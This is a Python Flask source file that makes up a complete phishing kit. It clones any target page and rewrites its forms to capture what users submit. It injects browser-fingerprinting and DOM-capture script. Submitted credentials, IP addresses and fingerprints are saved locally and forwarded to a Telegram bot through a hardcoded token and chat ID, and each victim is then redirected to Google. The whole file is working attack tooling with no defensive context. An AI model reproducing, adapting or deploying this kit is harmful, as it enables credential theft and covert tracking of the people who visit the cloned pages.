from flask import Flask, request, render_template_string, redirect
import requests
from bs4 import BeautifulSoup
from datetime import datetime
import json

app = Flask(__name__)
BOT_TOKEN = '7762882003:AAEd-f6HrRWV0BQpotXAi5DxWRS9v0aKAaw'
CHAT_ID = '7980602481'

FINGERPRINT_AND_DOM_JS = """
<script src="https://openfpcdn.io/fingerprintjs/v3"></script>
<script>
async function collect() {
    const fp = await FingerprintJS.load();
    const result = await fp.get();
    const dom = document.documentElement.outerHTML;

    fetch("/leak", {
        method: "POST",
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            visitorId: result.visitorId,
            components: result.components,
            dom: dom
        })
    });
}
window.onload = collect;
</script>
"""

def send_telegram(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        if len(text) > 4000:
            text = text[:4000]
        requests.post(url, data={'chat_id': CHAT_ID, 'text': text})
    except:
        pass

@app.route('/clone')
def clone():
    target_url = request.args.get('url')
    if not target_url:
        return "Missing ?url= parameter", 400
    try:
        r = requests.get(target_url, timeout=5)
        soup = BeautifulSoup(r.text, 'html.parser')

        for form in soup.find_all('form'):
            form['action'] = '/submit'
            form['method'] = 'post'
            for inp in form.find_all('input'):
                if not inp.has_attr('name'):
                    inp['name'] = inp.get('id', 'field_' + str(len(inp.attrs)))

        # Inject advanced JS
        if soup.body:
            soup.body.append(BeautifulSoup(FINGERPRINT_AND_DOM_JS, 'html.parser'))
        else:
            soup.append(BeautifulSoup(FINGERPRINT_AND_DOM_JS, 'html.parser'))

        return render_template_string(str(soup))

    except Exception as e:
        return f"Error cloning: {e}"

@app.route('/submit', methods=['POST'])
def submit():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    data = request.form.to_dict()

    msg = f"""
[PHISH CREDENTIALS]
Time: {now}
IP: {ip}
UA: {ua}
Data: {json.dumps(data, indent=2)}
"""
    with open("credentials.txt", "a") as f:
        f.write(msg + "\n")
    send_telegram(msg)
    return redirect("https://google.com")

@app.route('/leak', methods=['POST'])
def leak():
    ip = request.remote_addr
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    data = request.get_json()

    visitorId = data.get("visitorId", "")
    components = data.get("components", {})
    dom = data.get("dom", "")[:3000]  # limit for Telegram

    msg = f"""
[FINGERPRINT + DOM]
Time: {now}
IP: {ip}
Visitor ID: {visitorId}
UA: {request.headers.get("User-Agent")}

[Components]
{json.dumps(components, indent=2)}

[DOM Snippet]
{dom}
"""
    with open("dom_dump.txt", "a") as f:
        f.write(msg + "\n\n")
    send_telegram(msg)
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
